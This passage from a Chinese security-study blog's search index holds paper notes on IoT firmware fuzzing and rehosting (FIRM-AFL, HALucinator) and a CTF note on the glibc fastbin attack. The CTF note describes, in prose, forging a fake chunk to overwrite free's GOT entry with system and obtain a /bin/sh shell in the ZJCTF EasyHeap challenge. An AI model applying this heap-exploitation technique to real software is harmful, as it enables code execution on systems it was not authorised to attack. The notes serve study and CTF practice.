报告中可用的知识。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/extractor_-extracting-attack-behavior-from-threat-reports/","summary":"中文译名：提取器: 从威胁报表中提取攻击行为 作者：Kiavash Satvat 单位：伊利诺伊大学芝加哥分校 国家： #美国 年份： #2021年 来源： #SP 关键字： #","title":"Extractor_ Extracting Attack Behavior from Threat Reports"},{"content":"(72条消息) 堆漏洞挖掘——fastbin attack漏洞_董哥的黑板报的博客-CSDN博客 fastbin attack总体上来说就是去修改挂在fastbin上free chunk的fd指针。比如现在fastbin上挂着一个free的chunk a，它的fd指针为0。因为没有别的free chunk了。我们修改了这fd指针，指向了一个我们想编辑的区域，这样相当于是让系统误以为在a chunk后还有一个free chunk。我们通过两次malloc就可以得到fake chunk的指针，从而实现编辑该区域。 但是伪造fake chunk需要满足两个条件，size大小合适，并且PREV_INUSE为1。 由于系统中0x7f这样的数值比较好找，所以我们在目标区域周围找一找有没有0x7f，然后让fake chunk的size字段位于这个0x7f区域，这样就可以通过检查。 那如果找不到0x7f呢。需要 [[unsortedbin attack]]\ndouble free (72条消息) 好好说话之Fastbin Attack（1）：Fastbin Double Free_hollk的博客-CSDN博客\nhouse of spirit (72条消息) 好好说话之Fastbin Attack（2）：House Of Spirit_hollk的博客-CSDN博客 直接看例题好理解一点 [ZJCTF 2019]EasyHeap 漏洞点出在edit_heap函数，它没有对写入的size进行限制。 （btw，system函数的cat flag是假的） 这道题可以修改got表，我们的目标就是修改某个函数的got表，然后当调用这个函数的时候，调用了system函数。 比如我们将free函数的got表写成system函数的地址，那么我们调用free (\u0026quot;/bin/sh\u0026quot;) 就是system (\u0026quot;/bin/sh\u0026quot;) free函数的got地址可以通过elf. got[\u0026lsquo;free\u0026rsquo;]得到。同样的system地址也可以得到 那么如何修改free的got呢，我们可以伪造一个指向free got的fake chunk，然后将该fake chunk申请下来，就能修改free got的值 思路： 我们申请两个chunk a和b，将b free，然后通过a溢出修改b，将b的fb指向目标地址（就是got），这里要注意要找个有0x7f的地方。然后将b申请回来，然后再申请一个0x60大小的chunk就拿到了我们的fake chunk，修改fake chunk就把free的got改成system了。 然后我们申请一个chunk，chunk内容是\u0026quot;/bin/sh\u0026quot;，然后释放这个chunk，就ok了。 free (heaparray[n]) == system (heaparray[n]) == system (\u0026quot;/bin/sh\u0026quot;)\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/fastbin-attack/","summary":"(72条消息) 堆漏洞挖掘——fastbin attack漏洞_董哥的黑板报的博客-CSDN博客 fastbin attack总体上来说就是去修改挂在fastb","title":"fastbin attack"},{"content":"中文译名：FIRM-AFL：通过增强过程仿真实现的物联网固件的高通量灰盒模糊测试 作者：郑 yaowen 单位：中国科学院信息工程研究所北京物联网重点实验室 国家： #中国 年份： #2019年 来源： #USENIX会议 关键字： #嵌入式 #fuzzing 笔记建立时间： 2023-02-07 09:13\n作者题目中提到的高通量在文章体现为仿真器的高吞吐量。什么意思呢，就是说固件需要仿真运行在仿真器中，模糊测试喂给固件大量测试用例，但是目前的仿真手段对于喂给的测试用例执行的很慢，1 秒可能只执行 1 个或几个测试用例，即吞吐量小，作者实现的 FIRM-AFL 吞吐量很高。\n摘要 FIRM-AFL 是第一个针对物联网固件的高通量的灰盒模糊测试器 解决了兼容性问题——对可以在系统仿真器仿真的 POSIX 兼容固件进行模糊测试 解决了性能瓶颈——增强进程模拟的新技术 增强型进程仿真以一种新颖的方式将系统模式仿真和用户模式仿真结合起来，提供了系统模式仿真的高兼容性和用户模式仿真的高吞吐量。 看来本篇文章的主要工作在于这个增强进程仿真技术 引言 吞吐量是影响模糊效果的关键因素。根据文章的实验，全系统仿真比用户模式仿真 (AFL 使用的用户模式仿真) 慢大约 10 倍。10 倍的减速意味着在物联网程序中查找漏洞所需的计算资源大约是桌面程序的 10 倍。 全系统仿真的巨大运行时开销的一部分来自内存管理单元 (即 SoftMMU) 的软件实现，用于将虚拟机中发生的每一次内存访问的客户虚拟地址转换为主机虚拟地址。开销的另一部分来自系统调用模拟开销。 我们的解决方案：通过增强过程仿真进行灰盒模糊测试。 优势在于透明度和效率 透明度，即不需要对固件中的程序进行修改， 效率，即整个系统的模糊吞吐量应该接近用户模式仿真。 关键在于将全系统仿真和用户模式仿真相结合，得到了全系统仿真的通用性和用户模式仿真的效率。 主要是通过系统仿真来加强进程（或者说用户模式）的仿真。具体来说是被测程序主要运行在用户态的仿真以达到高效的目的，只有在必要时切换到全系统仿真，以保证程序的正确执行，从而实现通用性。 FIRM-AFL 基于 AFL 和 Firmadyne 实现，AFL 负责覆盖引导模糊测试，Firmadyne 负责仿真和全系统仿真与用户态仿真之间的切换 背景和动机 Fuzzing 和 qemu 跳过，没啥意思\n测试物联网固件 挑战 兼容性 代码覆盖率：黑盒模糊器的代码覆盖率很低，而白盒模糊器不能扩展到略大的代码库 同类型工具对比 Avatar：协调模拟器和物理硬件，Avatar 充当模拟器和实际硬件之间的软件代理。 由于涉及到白盒模糊和缓慢的硬件，Avatar 的吞吐量预计会很低。 IoTFuzzer：直接对设备进行黑盒测试，它的主要优点是通过目标设备的配套移动应用程序执行模糊。 IoTFuzzer 从未超过每秒 1 个测试用例的吞吐量，这是缓慢的 Firmadyne：在系统模式 QEMU 中增加了对 IoT 固件的硬件支持，通过修改内核和驱动程序来完全模拟系统，以处理由于缺乏实际硬件而导致的物联网异常。更容易适应新的 IOT 固件。 全系统模拟的吞吐量通常比本机执行（本机执行是指直接向硬件发送输入）好 AFL：AFL 可以通过 qemu 进行二进制模糊，但是无法成功模拟大多数物联网程序。 Muench 等人[28]的研究表示相比较于部分仿真和本机执行，完全仿真拥有最大的吞吐量。 因为物联网设备处理器要比桌面级处理器慢的多，所以你一旦涉及到真实硬件，速度就会被物联网设备处理器拖慢，所以基于桌面级处理器的全仿真要快得多 作者在这里的评价标准聚焦于吞吐量，不太明白这个吞吐量是啥，应该就是指设备接收测试用例的速度吧 动机 固件大多是二进制文件，基于仿真是最佳的 完全仿真吞吐量要高于其他仿真方法 吞吐量的瓶颈所在：\n内存地址转换：全系统仿真中的内存地址转换要比用户模式仿真中的复杂，耗时久 动态代码转换。块链接仅限于同一物理页面中的基本块，这意味着全系统仿真比在用户模式模拟中更频繁地调用转换器 系统调用仿真：用户模式仿真中，系统调用交给主机操作系统和硬件；但是在全系统仿真中，系统调用交给模拟的操作系统和硬件，速度较慢，并且其实不是所有的系统调用都需要仿真的操作系统和硬件来支持。 增强进程仿真 概述 挑战：兼容性和性能。第一个挑战可以通过全系统仿真来解决，但这会导致较差的性能。第二个挑战可以通过用户模式模拟解决，但会导致兼容性较差。 前提：\n固件可以在系统模拟器中正确地仿真 (例如，系统模式 QEMU)：在 Firmadyne[13]的帮助下，大部分 IoT 固件映像都能够满足这一要求。 固件支持 posix 兼容的操作系统：许多 IoT 固件映像使用 Linux 作为操作系统，因此满足了这一需求。 目标（对应了挑战的两点）：\n透明度：在增强进程模拟中运行的用户级程序的行为应该与在系统模式模拟中运行一样。 效率高：由于吞吐量是模糊的主要因素，增强的过程模拟需要尽可能高效。理想情况下，它应该接近纯用户模式模拟的性能。 方法概述 首先固件在系统模式模拟器中启动，用户级程序（包括要模糊测试的程序）也启动。 当要模糊化的程序到达预定的点 (例如，主函数的入口点，或在接收到第一个网络数据包后) 后，进程执行将迁移到用户模式模拟，以获得较高的执行速度。只有在极少数情况下，才会将执行迁移回系统模式执行，以确保执行的正确性。 为了最小化迁移成本，内存状态在这两种模拟模式之间共享。系统模式模拟和用户模式模拟通过 RAM 文件来实现内存共享。 注意，系统模式模拟将 RAM 文件视为物理内存，因此通过物理地址访问它，而用户模式模拟通过虚拟地址访问共享内存。 程序先在用户模式模拟下运行，当出现系统调用时，借助 RAM 文件，模拟器迁移到系统模式仿真处理系统调用。当系统调用返回时，模拟器迁移回用户模式模拟。 内存映射（Memory Mapping） 引导（bootstrapping） 在系统模式模拟中启动 IoT 固件，并进一步启动指定的 IoT 程序。通过 DECAF[23]（基于系统仿真的动态分析平台）提供的虚拟机内省进行监控执行情况，在执行达到预定 fork 点时遍历指定进程的页表，收集虚拟到物理的页映射信息，并将其发送到用户模式模拟端。然后，对于虚拟地址 (va) 到物理地址 (pa) 的每个映射，用户模式仿真端通过调用 mmap 建立映射，如下所示： 实际上，我们将 RAM 文件的一页以物理地址作为偏移量映射到指定的虚拟地址。参数 prot 由对应页表项的保护位决定。从这一点开始，系统模式模拟中的执行暂停，CPU 状态被发送到用户模式模拟，然后在那里继续执行。 理解：这里是指在程序刚启动的时候如何将系统级仿真和用户级仿真的内存进行共享——就是先在系统级仿真运行，然后将页表发送到用户级仿真，构建虚拟内存和物理内存的映射，实现两个模式下的内存映射的统一。这个部分就是初始化（所以称之为引导）。\n页面错误处理（Page fault handing） 当发生页面错误的时候如何协调两个模式呢。作者为用户模式模拟中的页面错误注册了一个信号处理程序，这样主机操作系统就会将页面错误事件传递给用户模式模拟。当接收到信号后，用户模式仿真将 CPU 状态发送到系统模式仿真端，期望在系统模式仿真中处理页面错误，并为故障虚拟地址建立新的映射。 系统模式模拟接收到 CPU 状态并恢复执行后，IoT 固件操作系统中的页面错误处理程序将响应此页面错误并尝试建立映射。 难点在于如何确定发生错误的时刻、页面映射建立的时刻 及时捕捉两种时刻，可以及时切换模式，最大限度提高速度 因为操作系统同时处理多个任务，同时可能会发生大量的上下文切换，所以有难度。 作者每个基本块的末尾，如果当前执行在指定的进程 (或线程) 内，则意味着执行已经从内核返回到用户空间，然后在 TLB 表中找到新建立的映射，连同 CPU 状态一块发送给用户模式模拟，它将通过调用 mmap 创建这个新的映射并恢复执行。 如果由于某种原因，发生了错误，进程被终止，我们可以依靠 DECAF[23]提供的 VMI (虚拟机自检) 功能来获得通知，然后双方的整个执行都被终止。 理解：程序会一直在用户模式模拟下运行，当发生页面错误需要系统调用的时候，就会把错误抛给系统模式仿真，由它处理问题建立新映射，处理好了然后切换回到用户模式模拟。\n预加载页面映射 因为现代操作系统以惰性方式加载内存页。每个页面映射建立的时刻是第一次访问的页错误，但是对于作者的模拟来说，频繁的页错误会拖慢模糊速度。作者的解决方案是对于要模糊的程序的页面进行预加载，在引导阶段模拟对程序每个代码页的访问，在系统模式模拟下就迫使操作系统将页面建立完整。 系统调用重定向 因为主机操作系统没办法完全处理物联网固件的系统调用，所以需要把用户模式模拟中的系统调用重定向到系统模式模拟。 更具体地说，当用户模式模拟遇到系统调用时，它暂停执行，保存当前 CPU 状态，并将其发送给系统模式模拟。系统模式模拟接收 CPU 状态并恢复执行。这将导致客户系统中的模式切换到内核模式以处理相应的系统调用。同样，由于客户操作系统内核是多任务的，在系统调用返回之前可能会发生许多上下文切换。因此，与处理页面错误的方式类似，我们将检测每个基本块的末尾。如果当前基本块在内核空间中，但是下一个程序计数器在用户级别，并且当前执行上下文是用于进行系统调用的线程的，那么我们检测系统调用返回的时刻。此时，我们暂停系统模式模拟中的执行，保存 CPU 状态，并将其传递回用户模式模拟，然后用户模式模拟将继续执行。 理解：简单来说，这个问题本质上和页错误一样的，处理方法也一样。 优化与文件系统相关的系统调用 作者发现物联网程序发出的许多系统调用都和文件系统有关。 所以作者采用直接讲固件镜像中的文件系统挂载在主机操作系统上，这样当处于模拟中的物联网程序需要访问文件系统时无需切换到系统模式模拟中，可以直接在用户模式模拟中通过主机操作系统访问文件系统。 Firm-AFL 的设计和实现 AFL 的工作流 AFL 很熟了，不再赘述。\n带有增强进程仿真的 AFL FIRM-AFL 的差别在于用增强进程仿真代替了 QEMU 。\n引导 没有新东西，和前面说的一样。\nForking 区别于 AFL 默认 main 函数为 fork 点，本文因为想要找通过网络接口触发的漏洞，所以与网络相关的系统调用的第一次调用都将作为 fork 点 不仅需要为用户模式模拟派生一个子进程，还需要为系统模式模拟“派生”一个新的虚拟机实例，因为两种模式必须彼此同步。但是创建一个新的虚拟机代价太高，所以作者选择在 fork 点创建快照的方式。 QEMU 提供了快照功能，将所有 CPU 寄存器和内存空间保存到特定的文件中。，但是文件的读写操作还是非常慢。作者实现了一种基于写时拷贝原则的轻量级快照机制。 原理是不全部记录初始的内存状态，只记录那些在程序运行时会被修改的页的初始状态。当新一轮的 fuzz 要开始时，将保存的页的初始状态写回。 更具体地说，我们首先将映射到系统模式 QEMU 的 RAM 文件标记为只读。然后内存写入将导致页面错误。我们复制该页，然后将该页标记为可写。因此，我们记录在一次模糊执行期间修改过的所有内存页。在恢复快照时，我们只需要将这些记录的页面写回。 理解：作者在此部分的工作创新点主要是这个快照机制，只记录会变的，不变的不去动它。 Feeding input 输入通过检测系统调用提供。对于从网络接口接收输入的物联网程序，我们直接在用户模式模拟中检测与网络相关的系统调用，因此不需要将这些系统调用重定向到系统模式模拟。 理解：因为输入是我们提供的，所以我们直接在用户模式模拟下截获对网络输入的系统调用，直接把输入 feed，不用切换到系统模拟模式下。\n收集覆盖信息 由于大多数执行都发生在用户模式模拟中，而系统模式模拟只需要处理页面错误和一些系统调用，所以在用户模式模拟中采取 AFL 的收集覆盖信息的措施——计算覆盖位图。 评价 问题 透明度。能否从物联网固件中提取 FIRM-AFL fuzz 程序，就像它们在全系统模拟器中运行一样? 效率高。FIRM-AFL 的吞吐量 (执行/秒) 与基于纯用户模式仿真的模糊器的吞吐量有多接近? 优化的有效性。我们的优化技术是否成功地解决了我们确定的性能瓶颈? 漏洞发现的有效性。FIRM-AFL 在物联网固件中发现真正漏洞的有效性如何? 疑问 全系统仿真和用户模式仿真的区别是啥 关于 qume 的仿真原理 Mmap 函数 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/firm-afl_-high-throughput-greybox-fuzzing-of-iot-firmware-via-augmented-process-emulation/","summary":"中文译名：FIRM-AFL：通过增强过程仿真实现的物联网固件的高通量灰盒模糊测试 作者：郑 yaowen 单位：中国科学院信息工程研究所北京物联网重点实验室","title":"FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation"},{"content":"#TODO [[SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits]]\n变异策略分为粗细粒度 粗粒度：将每次的输入称之为模糊实例，测量模糊实例和脆弱函数之间的距离（距离是两者之间最短路径的节点数），距离越小的输入作为新种子的优先级越高 粗粒度主要修改的是系统调用序列 细粒度：和粗粒度差不多，但是距离是两个基本块之间的距离 细粒度主要修改的是参数值 [[BEACON Directed Grey-Box Fuzzing with Provable Path Pruning]]\n本文提供了一个符号执行求解条件在fuzz应用上的一个折中的方法。从脆弱函数向上一直到入口函数，把条件积累。不去算符号的值，而是去算符号值的范围。这样就可以将很大一批随机变异得到的输入给排除掉。 [[ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery]]\n和semfuzz一样来自游伟老师 本文的点在于可以自动的探测被fuzz对象的输入格式（可能还到不了输入格式这个程度），依据反馈将相同反馈的字节连接形成字段，并且识别字段的类型（作者自己定义了几个类型）。然后再进行fuzz。 好处在于字节连接成字段后，可以有效的进行变异，就减少那些根本输入都输入不了的输入实例。提高fuzz效率。 [[Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing]]\n作者认为智能电视的安卓操作系统中有很多厂商自定义添加的API，这种API存在漏洞的风险比较高，作者专注于fuzz这种API 作者首先定位API 然后对API fuzz，收集日志信息 首先过滤和目标API无关的日志信息 然后通过一个训练好的分类器来识别过滤后的日志信息中哪些和输入验证相关 [[SeededFuzz Selecting and Generating Seeds for Directed Fuzzing]] [[Semantic-Informed Driver Fuzzing Without Both the Hardware Devices and the Emulators]]\n这篇文章的fuzz对象是驱动，作者认为不需要设备的驱动fuzz关键在于通过驱动的验证链 [[Hawkeye： Towards a Desired Directed Grey-box Fuzzer]]\n经典论文 作者做到 有效的计算距离，因为计算方法的问题，可能计算出来的最短距离并不是实际上的最短距离（AFLGO的问题）；不考虑所有的路径可能会漏掉隐藏在较长路径深处的错误 计算距离的时候考虑了被调用函数的被调用概率，概率越大越近 分为两种函数级距离和基本块级距离（两种计算方式用于能量调度） 减小静态分析的开销 对整个程序的函数指针应用基于包含的指针分析 如何高效能量分配 计算基本块跟踪距离和覆盖函数相似度，基于这两个值来确定种子优先级 如何动态调整变异策略 适应性突变 [[FIRM-AFL_ High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation]]\n本文的点在将固件的内存映射到系统内存，增加了fuzz的速度（文中称之为吞吐量） ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/3.%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/fuzz%E6%95%B4%E7%90%86/","summary":"#TODO [[SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits]] 变异策略分为粗细粒度 粗粒度：将每次的输入称之为模糊实例，测量模糊实例和脆弱函数之间的距离（距离是两者之间最短路径的节点数），","title":"fuzz整理"},{"content":"中文译名：HALucinator: 通过抽象层仿真重新托管固件 作者：Abraham A. Clements 单位：桑迪亚国家实验室 国家： #美国 年份： #2020年 来源： #USENIX会议 关键字： #固件 #仿真托管 代码地址： 笔记建立时间： 2023-03-04 10:29\n摘要 背景：硬件和固件之间的紧密耦合以及嵌入式系统中的多样性使得对固件进行动态分析变得困难。 现状：固件开发人员经常使用抽象，如硬件抽象层（HAL），来简化他们的工作。 方法：利用这些抽象作为重新托管和分析固件的基础。通过为 HAL 函数提供高级替代（一个称为高级模拟 - HLE 的过程），将硬件和固件分离。首先通过二进制分析定位固件样本中的库函数，然后在全系统模拟器中提供这些函数的通用实现。 工作：对现有库匹配技术进行扩展，可以识别二进制固件中的库函数；使用简化处理程序喝外设模型来进行 re-hosting；集成到 AFL 来演示安全分析方面的应用\n1引言 背景： 固件动态分析难\n固件有硬件依赖性，传统的手段不好实施 嵌入式硬件提供有限的内省能力，包括极其有限数量的断点和监视点，大大限制了对固件进行动态分析的能力。 没有源代码，并且固件难以获得，即使得到固件也难以处理复杂的环境依赖 模拟具有局限性：\n嵌入式硬件中的异构性对固件模拟构成了重大障碍，模拟需要对片上外设和内存布局以专门方式支持 流行的开源 QEMU 模拟器支持不到 30 种 ARM 设备 英特尔的 SIMICS [38, 57]支持许多 CPU 和外设，但要求分析师手动构建硬件级别的完整系统模型。 大多数嵌入式系统还需要其他硬件组件才可能使固件运行（如传感器、存储设备或网络组件），然而这些外设几乎没有模拟支持 现状：\n模拟器将固件与不受支持的外设的交互转发的真实设备上 受硬件可用的限制 分析和插桩受限 记录并重放或建模来自硬件的数据 上述问题同样困扰固件开发人员 芯片供应商和各种第三方提供了硬件抽象层 HAL。HAL 是软件库，为程序员提供高级硬件操作，同时隐藏固件执行所在特定芯片或系统的细节。 方法： 通过使用高级抽象层和可重用的替换功能来实现嵌入式系统的可扩展模拟，称为高级模拟 (HLE)\n首先识别固件映像中负责硬件交互的 HAL 函数 然后 HLE 提供简单的、分析师创建的高级替换（称之为处理程序）替换 HAL 函数， 这种替换可以扩展到来自同一供应商的芯片，甚至扩展到使用相同中间件库的固件 这些处理程序可以使用外设模型，它们作为硬件外设通用类别的抽象，并在模拟环境和主机环境之间作为交互点，而无需复杂逻辑。 贡献：\n在 QEMU 的基础上利用 HAL 实现了一个高级模拟系统 HALucinator 支持多个芯片供应商的 ARM Cortex-M 架构的 blob 固件 改进了现有的库匹配技术，以更好地定位固件中用于拦截的函数 利用 HALucinator 进行固件的模糊测试，效果良好 2动机 鉴于目前市场上的趋势，作者预计未来固件中将普遍采用 HAL。\n2.1 模拟硬件和外设 片上外设可以通过模拟内存映射 I/O（MMIO）来实现，因为在芯片文档中对每个外设的 MMIO 区域的确切布局和语义有描述 进一步复杂化重新托管的是固件与片外设备（例如传感器、执行器、外部存储设备或通信硬件）之间的交互。 这种外设涉及到定制化的电路板，所以每个固件样本的完整执行环境基本上都是独一无二的 想要使用现有的仿真工具进行模拟，就必须实现符合固件使用 MMIO 寄存器接口规范的片上和片外设备的模拟。\n2.2 固件栈 图 2a 展示了一个通过 http 服务器获取温度的软硬件堆栈。首先 http server 的某个应用程序调用温度传感器制造商提供的库中的 API 来获取温度，该库向下又调用微控制器制造商提供的 I2C HAL 通过 I2C 总线与温度传感器通信获得温度信息。Http server 得到温度后，调用 OS 库的 API 发送和接收 TCP 信息，OS 使用 LWIP 库进行 tcp 报文的封装，LWIP 库使用以太网 HAL 通过物理以太网端口发送以太网帧。 这个例子表示，现代设备的复杂性和减少开发时间的压力越来越使得固件中的功能建立在一系列中间件库和 HAL 之上。这样实现了应用程序和物理硬件的分离。为了让 HALucinator 打破固件与硬件之间的耦合，它必须拦截其中一个层次——中间件/库或 HAL——并插入其替代功能。 所以选择在哪个层次进行替换需要权衡高级替换的通用性和可重用性、代码量以及在目标设备固件中找到给定库的可能性。 作者可以确定固件开发者更有可能使用芯片供应商的 HAL，而对于更高层次（如网络堆栈或中间件），无法预测开发者用了什么库。所以作者主要关注在 HAL 层次上重新托管。 但是作者也指出 HAL 层具有最多的函数，并且与硬件产生复杂的交互（中断和 DMA），而围绕高层次的库构建的处理程序可以更简单，更容易在设备间移植。\n2.3 高级仿真 作者的方法减少了模拟的工作量，模拟工作量随着 HAL 或中间件库数量增加而增长得更慢。 高级模拟消除了理解硬件低级细节的要求。因此，处理程序不需要实现低级 MMIO 操作，而只需截获相应的 HAL 函数，将所需参数传递给适当的外设模型并返回固件期望的值即可。 对于分析时不关心或者不必要的外设，作者的方法也允许使用简单低保真度处理程序绕过该函数并返回指示成功执行的值 3 设计 为了让我们的设计充分利用高层模拟的优势，我们需要（1）在固件中找到HAL库函数（例如，通过库匹配），（2）为HAL函数提供高层替代品，并且（3）启用与模拟固件的外部交互。 HALucinator采用模块化设计，以便于其与各种固件和分析情况一起使用，如图1所示。 为了介绍HALucinator的各个阶段和组成部分，让我们考虑一个简单的示例固件，它使用串行端口将来自连接计算机的字符回显。 除了硬件初始化代码外，此固件仅需要发送和接收串行数据的能力。 分析师注意到设备的CPU是STM32F4微控制器，并使用第3.2节中介绍的LibMatch分析，并为STMicroelectrics’ HAL库构建数据库以用于此芯片系列。 这确定了二进制文件中的HAL_UART_Receive和HAL_UART_Transmit。 然后，分析师为HALucinator创建配置，指示应使用一组处理程序（即高级功能替换）来处理包含的HAL。 如果处理程序尚不存在，则由分析师创建它们。 这两个HAL函数将串行端口引用、缓冲区指针和长度作为参数传递。 为了节省精力，这些处理程序只需将这些参数转换成可由串行端口外设模型使用的形式（例如要发送或接收的原始数据）。 最后，I/O服务器在串行端口外设模型和主机计算机终端之间传输数据。 现在，在HALucinator中执行固件时，可以像任何其他控制台程序一样通过终端使用固件。 这只代表了HALucinator能力的一小部分，在以下各节中我们将详细探讨。\n3.1 先决条件 需要设备的完整固件 想要模拟的库和编译工具链 一个能够忠实执行固件代码并能够支持 HALucinator 的仪器的底层模拟器 可配置的内存布局 能挂钩代码中的特定地址以触发高级处理程序 访问模拟器的寄存器和内存 虽然这看起来是一长串要求，但实际上获得它们很简单。对于我们在本工作中关注的 ARM Cortex-M 设备，通用内存映射已标准化并可从供应商提供的手册中轻松获得，固件在内存中的位置可以从固件 blob 本身读取，并且常见模拟器（例如 QEMU [18]）忠实地模拟指令。每个 Cortex-M 供应商都为其芯片提供开源 HAL（s），带有编译器和配置[16、34、42、53]。为了将 HALucinator 应用于特定设备，所需的只是获取固件，知道 CPU 的供应商并获取其 SDK。\n3.2 libmatch 目的：High level emulation 的一个关键部分就是需要在程序中定位可以用作模拟基础的抽象 现状： 现有解决在剥离二进制文件中查找函数问题的方法[24、33、35]缺乏对嵌入式 CPU 架构（尤其是 ARM Cortex-M 架构）的支持，该架构常用于许多消费级别的设备并且在本工作中使用。 固件库函数通常会对大小进行优化，导致两个几乎相同的代码却用于截然不同的目的 固件库函数的一个不寻常特征是它们经常调用非库部分代码中的函数 意思是有一部分固件库函数的参数是函数指针，也就是回调函数，所以为了提供完全工作的处理程序，我们不仅必须恢复库函数名称和地址，还必须恢复它们调用应用程序代码的名称和地址。 方法：libmatch，利用程序中函数的上下文来帮助二进制到库匹配 通过提取库的未链接二进制对象文件的控制流图以及它们代码的中间表示（IR）来创建 HAL 函数匹配数据库 然后基于以下几个原则进行匹配： 统计比较：比较目标程序和数据库中库函数的基本块数量、CFG 边和函数调用 基本块比较：如果两个函数的每个基本块的 IR 内容完全匹配，我们认为它们匹配。 上下文匹配：前一步可以输出一组匹配，但是也会输出那些没有匹配成功的函数，那么利用目标程序中函数的上下文中已经匹配成功的函数来推断函数可能是什么 最后，如果给目标二进制中的一个函数分配了唯一名称，则确定为有效匹配。 3.3 高级模拟 Handlers\n我们将固件中 HAL 代码的高级替换称为处理程序（Handlers）。 创建处理程序是手动完成的，但只需要为每个 HAL 或库执行一次，并且与正在分析的固件无关 几乎所有的处理程序都很简单，属于几个基本类别之一（比如在外围模型上执行琐碎的操作，返回常量值，或者什么都不做），对于复杂的 HAL 可以利用迭代过程来构建处理程序 首先分析人员在 HALucinator 运行二进制文件，它将报告当前未被处理程序替换的所有 I/O 访问以及位置 如果固件卡住了，或者缺少所需的行为，分析人员可以评估哪些函数包含 I/O 操作，并考虑实现一个处理程序。过程重复，连续的处理程序产生更大的覆盖范围和更准确的功能。 外设模型\n用于模拟外设行为，负责处理固件和外设交互的模型 I/O server\n用于外设模型和主机系统的交互。 HAL 外的外设访问\n固件中也存在直接发起（绕过 HAL）的 MMIO 访问 HALucinator 将向用户报告所有此类 I/O，对这些区域的所有读取操作都将返回零，并且所有写入都将被忽略，从而允许直接与硬件交互的代码执行而不崩溃。（作者发现大多数 MMIO 访问可以安全的忽略） 3.4 使用 HALucinator 进行模糊测试 Fuzzed input\nHALucinator 提供了将 fuzzer 的输入流转入到处理程序的方法 Termination\n目前的模糊器通常针对桌面程序，并期望它们在输入耗尽时终止; 但是，固件永远不会终止。 HALucinator，设计 fuzz 模型以优雅地退出程序，向 fuzzer 发送一个信号，表明程序在执行期间没有崩溃。 Non-determinism\n固件有明显的不确定性行为，必须删除，以允许 fuzzer 正确地收集覆盖指标 HALucinator 在确定产生随机性的函数时，为它们提供静态处理程序 Timers\n不确定性的一个特殊情况是定时器，它经常作为特殊的外围设备出现在微控制器中，以指定的间隔触发中断和其他事件 我们提供了一个定时器外围模型，它将计时器的速率与执行块的数量联系起来，创建确定的计时器行为，并公平地执行计时器的中断处理程序和主程序，而不考虑仿真速度。 Crash Detection\n基于高级仿真的系统从仿真器提供的可见性中获得了大量的崩溃检测能力 高级模拟处理程序可以执行它们自己的检查 高级仿真还可用于轻松添加通常在编译时处理的插装 Input Generation\n模糊化需要有代表性的输入来为其突变算法提供种子。HALucinator 的全交互模式可用于与设备交互，并记录感兴趣的库调用的返回值，这可用于种子模糊 实施 LibMatch 基于 angr 二进制分析平台，对 angr 进行扩展，增加了对 Cortex-M 调用约定、缺失指令、函数开始检测和间接跳转解析的支持。 LibMatch 使用带有符号的未链接的目标文件，来创建已知函数的数据库，使用这个数据库来定位固件中没有符号的函数。 当 LibMatch 针对固件样例运行时，它输出一个已识别的函数及其地址列表，并记录冲突，以防人工分析人员希望手动解决冲突。 HALucinator Implementation HALucinator 是用 Python 实现的，并使用 Avatar2 来设置一个全系统 QEMU 仿真目标并检测其执行 虽然 Avatar2 通常是作为硬件在环编制方案部署的，但我们在这里仅使用它来实现对 QEMU 的灵活控制，而不是用于任何与硬件相关的目的 输入：内存布局、要拦截的函数列表和相关处理程序，来自 libMatch 的函数和地址列表 操作：在要拦截的每个函数的第一条指令上放置断点，并注册处理程序，以便在命中断点时执行 Handlers 处理程序被实现为 Python 类，每个函数覆盖固件的 HAL 或库中的一个或多个函数 可以读取或写入模拟器的寄存器和内存 调用固件本身函数 与外围模型交互 外设模型 外设模型作为 Python 类实现，可以充分利用系统库或 I/O 服务器来实现所需的功能 例如，从硬件实时时钟获取时间的调用可以简单地调用主机系统的 time () 函数。 I/O 服务器 使用 ZeroMQ消息传递库实现为发布-订阅系统。除了向主机系统的外围模型提供事件外，I/O 服务器还可以将模拟器的外围模型连接在一起，从而允许模拟多个互连的系统。 Fuzzing with HALucinator 将 HALucinator 中心的全系统 QEMU 引擎替换为 AFLUnicorn AFL- unicorn 将 QEMU 的 ISA 模拟特性与灵活的 API 结合在一起，并提供 AFL 使用的覆盖工具和分叉服务器功能 HALucinator 的高级仿真可以提供所需的外围硬件支持 评估 Library Identification in Binaries 我们首先探讨 LibMatch 在二进制固件程序中恢复函数地址的有效性。由于固件中有多个位置可能被连接，在模拟的复杂性中有各种各样的权衡，在这里我们尝试匹配 HAL 及其相关中间件提供的整个功能集。我们在每个目标固件样例中使用符号信息来提供每个函数的真实地址。然后，LibMatch 尝试使用该二进制文件的剥离版本确定其 HAL 数据库中每个函数的地址。表 1 显示了使用 LibMatch 进行上下文匹配和不进行上下文匹配的 16 个固件示例的比较。没有上下文匹配的 LibMatch 与当前匹配算法 (例如，BinDiff[28]或 Diaphora[21]) 所实现的效果相当。然而，直接比较是不可能的，因为这些工具只执行链接二进制到链接二进制的比较，而 LibMatch 必须将链接二进制与从 HALs 和中间件获得的未链接库对象集合相匹配。在表 1 中，HAL 符号的数量是固件中存在的库函数的数量，而“正确”列显示了那些正确识别的函数的数量。“碰撞”、“不正确”和“缺失”列描述了 LibMatch 无法正确识别未匹配函数的原因。最后一列，\u0026rsquo; External \u0026lsquo;是 HAL 库外部的函数的数量，LibMatch 与上下文匹配标签正确。总的来说，在 16 个应用程序中，没有上下文匹配的 LibMatch 平均匹配了 